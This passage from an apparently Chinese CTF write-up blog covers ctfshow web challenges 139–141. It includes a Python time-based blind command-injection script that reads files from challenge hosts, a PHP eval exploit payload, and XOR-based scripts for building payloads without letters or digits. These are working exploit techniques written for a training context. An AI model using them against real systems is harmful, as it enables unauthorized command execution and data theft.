<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> n </span><span style="color:#c586c0">in</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">str</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">            payload = </span><span style="color:#ce9178">"if [ `ls /|awk 'NR==</span><span style="color:#569cd6">{0}</span><span style="color:#ce9178">'|cut -c </span><span style="color:#569cd6">{1}</span><span style="color:#ce9178">` == </span><span style="color:#569cd6">{2}</span><span style="color:#ce9178"> ];then sleep 3;fi"</span><span style="color:#d4d4d4">.format(i, j, n)</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#6a9955"># print(payload)</span></span>
<span class="line"><span style="color:#d4d4d4">            url = </span><span style="color:#ce9178">"http://92e434bc-fd91-41d2-838b-d5e5bdbf7128.challenge.ctf.show/?c="</span><span style="color:#d4d4d4"> + payload</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">try</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">                requests.get(url, </span><span style="color:#9cdcfe">timeout</span><span style="color:#d4d4d4">=</span><span style="color:#b5cea8">2.5</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">except</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">                result += n</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(result)</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#c586c0">break</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> n == </span><span style="color:#ce9178">')'</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">                key = </span><span style="color:#b5cea8">1</span></span>
<span class="line"><span style="color:#d4d4d4">    result += </span><span style="color:#ce9178">' '</span></span></code></pre></div></div></figure><p>得到当前目录所有文件，发现疑似 flag 文件：f149_15_h3r3</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212281851904.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221228185158825"></p><p>脚本跑出 flag：</p><figure class="shiki python"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Time    : 2022/12/28 18:52</span></span>
<span class="line"><span style="color:#6a9955"># @Author  : f0ur_lin</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> string</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> requests</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4ec9b0">str</span><span style="color:#d4d4d4"> = string.ascii_letters + string.digits + </span><span style="color:#ce9178">'-'</span><span style="color:#d4d4d4"> + </span><span style="color:#ce9178">'{'</span><span style="color:#d4d4d4"> + </span><span style="color:#ce9178">'}'</span></span>
<span class="line"><span style="color:#d4d4d4">result = </span><span style="color:#ce9178">""</span></span>
<span class="line"><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> j </span><span style="color:#c586c0">in</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">range</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">45</span><span style="color:#d4d4d4">):</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> n </span><span style="color:#c586c0">in</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">str</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">        payload = </span><span style="color:#ce9178">"if [ `cat /f149_15_h3r3 |cut -c </span><span style="color:#569cd6">{0}</span><span style="color:#ce9178">` == </span><span style="color:#569cd6">{1}</span><span style="color:#ce9178"> ];then sleep 3;fi"</span><span style="color:#d4d4d4">.format(j, n)</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#6a9955"># print(payload)</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#6a9955"># url = "http://92e434bc-fd91-41d2-838b-d5e5bdbf7128.challenge.ctf.show/?c=" + payload</span></span>
<span class="line"><span style="color:#d4d4d4">        url = </span><span style="color:#ce9178">"http://25a13c11-9a13-420b-ba44-691191ba658d.challenge.ctf.show/?c="</span><span style="color:#d4d4d4"> + payload</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">try</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">            requests.get(url, </span><span style="color:#9cdcfe">timeout</span><span style="color:#d4d4d4">=</span><span style="color:#b5cea8">2.5</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">except</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">            result += n</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(result)</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">break</span></span></code></pre></div></div></figure><p>得到 flag，ctfshow24b51dc1-3f03-4c3a-8faa-c1ad8b4c5ceb</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212282006143.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221228200619022"></p><p>然后用括号包括即可。</p><h3 id="web140函数嵌套"><a class="markdownIt-Anchor" href="#web140函数嵌套"></a> web140（函数嵌套）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'f1'</span><span style="color:#d4d4d4">]) &amp;&amp; </span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'f2'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$f1</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'f1'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$f2</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'f2'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/</span><span style="color:#d4d4d4">^</span><span style="color:#d16969">[a-z0-9]</span><span style="color:#d4d4d4">+$</span><span style="color:#d16969">/'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$f1</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/</span><span style="color:#d4d4d4">^</span><span style="color:#d16969">[a-z0-9]</span><span style="color:#d4d4d4">+$</span><span style="color:#d16969">/'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$f2</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$code</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"return </span><span style="color:#9cdcfe">$f1</span><span style="color:#ce9178">(</span><span style="color:#9cdcfe">$f2</span><span style="color:#ce9178">());"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$code</span><span style="color:#d4d4d4">) == </span><span style="color:#ce9178">'ctfshow'</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">file_get_contents</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            }</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>intval 一个字符串的结果是 int (0) ，那么基本上这个最终 if 里面的判断是很容易成立的了。</p><p>需要注意 $f1 ( <span class="katex-error" title="ParseError: KaTeX parse error: LaTeX-incompatible input and strict mode is set to 'error': Unicode text character &quot;里&quot; used in math mode [unicodeTextInMathMode] at position 7: f2() )里̲面">f2 ()) 里面</span> f2 也是带括号的。也就是说 f2 需要来一个可选参数的函数。</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955"># post:</span></span>
<span class="line"><span style="color:#d4d4d4">f1=system</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">f2=system</span></span>
<span class="line"><span style="color:#d4d4d4">f1=getdate</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">f2=getdate</span></span></code></pre></div></div></figure><h3 id="web141无字母数字下划线rce"><a class="markdownIt-Anchor" href="#web141无字母数字下划线rce"></a> ***web141（无字母数字下划线 RCE）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">#error_reporting(0);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">]) &amp;&amp; </span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">]) &amp;&amp; </span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v3'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v3'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">) &amp;&amp; </span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/</span><span style="color:#d4d4d4">^</span><span style="color:#d7ba7d">\W</span><span style="color:#d4d4d4">+$</span><span style="color:#d16969">/'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$code</span><span style="color:#d4d4d4"> =  </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"return </span><span style="color:#9cdcfe">$v1$v3$v2</span><span style="color:#ce9178">;"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"</span><span style="color:#9cdcfe">$v1$v3$v2</span><span style="color:#ce9178"> = "</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$code</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>这里的 \W 会匹配任何非字母非数字的字符。然后要明白的是，php 中数字即使与函数一起也是能够执行的，如：1+phpinfo ()+1;	最终还是能够执行成功的。</p><p>所以我们现在除了 v1 和 v2 不需要担心之外，要构造出来 v3 的能够命令执行的函数或者操作等。方法很多。</p><h4 id="1异或"><a class="markdownIt-Anchor" href="#1异或"></a> 1. 异或</h4><p>异或构造可以先用脚本看看可用字符：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: yu22x</span></span>
<span class="line"><span style="color:#6a9955"># @Date:   2022-12-31 05:26:04</span></span>
<span class="line"><span style="color:#6a9955"># @Last Modified by:   f0ur_lin</span></span>
<span class="line"><span style="color:#6a9955"># @Last Modified time: 2022-12-31 05:28:59</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9cdcfe">$myfile</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">fopen</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"xor_rce2.txt"</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"w"</span><span style="color:#d4d4d4">); </span><span style="color:#6a9955">// 新建一个文本文件，将可用字符放在里面</span></span>
<span class="line"><span style="color:#9cdcfe">$contents</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">""</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> (</span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4">=</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">; </span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4"> &lt; </span><span style="color:#b5cea8">256</span><span style="color:#d4d4d4">; </span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4">++) { </span></span>
<span class="line"><span style="color:#d4d4d4">	</span><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> (</span><span style="color:#9cdcfe">$j</span><span style="color:#d4d4d4">=</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">; </span><span style="color:#9cdcfe">$j</span><span style="color:#d4d4d4"> &lt;</span><span style="color:#b5cea8">256</span><span style="color:#d4d4d4"> ; </span><span style="color:#9cdcfe">$j</span><span style="color:#d4d4d4">++) { </span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4">&lt;</span><span style="color:#b5cea8">16</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">			</span><span style="color:#9cdcfe">$hex_i</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">'0'</span><span style="color:#d4d4d4">.</span><span style="color:#dcdcaa">dechex</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4">); </span><span style="color:#6a9955">// dechex()将十进制转为十六进制</span></span>
<span class="line"><span style="color:#d4d4d4">		}</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">			</span><span style="color:#9cdcfe">$hex_i</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">dechex</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$i</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">		}</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$j</span><span style="color:#d4d4d4">&lt;</span><span style="color:#b5cea8">16</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">			</span><span style="color:#9cdcfe">$hex_j</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">'0'</span><span style="color:#d4d4d4">.</span><span style="color:#dcdcaa">dechex</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$j</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">		}</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">			</span><span style="color:#9cdcfe">$hex_j</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">dechex</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$j</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">		}</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#6a9955">// 注意题目的正则要求是匹配还是不能被匹配到，该脚本得到的是不能被匹配的结果</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#9cdcfe">$preg</span><span style="color:#d4d4d4"> = </span><span style="color:#d16969">'/[A-Za-z0-9_]/'</span><span style="color:#d4d4d4">; </span><span style="color:#6a9955">//根据题目给的正则表达式修改即可</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$preg</span><span style="color:#d4d4d4"> , </span><span style="color:#dcdcaa">hex2bin</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$hex_i</span><span style="color:#d4d4d4">))||</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$preg</span><span style="color:#d4d4d4"> , </span><span style="color:#dcdcaa">hex2bin</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$hex_j</span><span style="color:#d4d4d4">))){  </span><span style="color:#6a9955">//hex2bin()将十六进制转为ascii</span></span>
<span class="line"><span style="color:#d4d4d4">					</span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">""</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">  </span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">'%'</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$hex_i</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">'%'</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$hex_j</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">=(</span><span style="color:#dcdcaa">urldecode</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">)^</span><span style="color:#dcdcaa">urldecode</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">)); </span><span style="color:#6a9955"># 将符合条件的字符url解码并异或</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#dcdcaa">ord</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">)&gt;=</span><span style="color:#b5cea8">32</span><span style="color:#569cd6">&amp;</span><span style="color:#dcdcaa">ord</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">)&lt;=</span><span style="color:#b5cea8">126</span><span style="color:#d4d4d4">) {  </span><span style="color:#6a9955"># 对于所有字符，筛选出符合条件的</span></span>
<span class="line"><span style="color:#d4d4d4">			</span><span style="color:#9cdcfe">$contents</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$contents</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">" "</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">" "</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\n</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">		}</span></span>
<span class="line"><span style="color:#d4d4d4">	}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#dcdcaa">fwrite</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$myfile</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$contents</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">fclose</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$myfile</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><p>脚本会在同级目录下生成 txt，然后可以用脚本半自动的生成一个我们想要的异或字符串：</p><figure class="shiki python"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: yu22x</span></span>
<span class="line"><span style="color:#6a9955"># @Date:   2022-12-31 05:31:46</span></span>
<span class="line"><span style="color:#6a9955"># @Last Modified by:   f0ur_lin</span></span>
<span class="line"><span style="color:#6a9955"># @Last Modified time: 2022-12-31 05:33:14</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> requests</span></span>
<span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> urllib</span></span>
<span class="line"><span style="color:#c586c0">from</span><span style="color:#d4d4d4"> sys </span><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> *</span></span>
<span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> os</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">def</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">action</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">arg</span><span style="color:#d4d4d4">):</span></span>
<span class="line"><span style="color:#d4d4d4">    s1 = </span><span style="color:#ce9178">""</span></span>
<span class="line"><span style="color:#d4d4d4">    s2 = </span><span style="color:#ce9178">""</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> i </span><span style="color:#c586c0">in</span><span style="color:#d4d4d4"> arg:</span></span>
<span class="line"><span style="color:#d4d4d4">        f = </span><span style="color:#dcdcaa">open</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"xor_rce2.txt"</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"r"</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">while</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">True</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">            t = f.readline()</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> t == </span><span style="color:#ce9178">""</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#c586c0">break</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> t[</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">] == i:</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#6a9955"># print(i)</span></span>
